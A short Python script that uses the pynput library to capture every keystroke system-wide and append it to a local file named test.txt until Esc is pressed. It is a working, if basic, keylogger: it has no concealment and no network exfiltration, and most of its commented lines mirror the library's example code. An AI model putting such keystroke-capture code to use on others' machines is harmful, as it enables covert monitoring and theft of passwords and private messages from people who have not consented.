from pynput import keyboard


string = ""
def on_press(key):
    f = open("test.txt", "a")
    try:

        # print('alphanumeric key {0} pressed'.format(
        #     key.char))
        f.write(key.char)
        f.close()
    except AttributeError:
        # print('special key {0} pressed'.format(
        #     key))
        if str(key) == "Key.enter":
            f.write('\n')
        elif str(key) == "Key.space":
            f.write(' ')
        f.close()


def on_release(key):
    # print('{0} released'.format(
    #     key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False


print("test")

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# # ...or, in a non-blocking fashion:
# listener = keyboard.Listener(
#     on_press=on_press,
#     on_release=on_release
# listener.start()
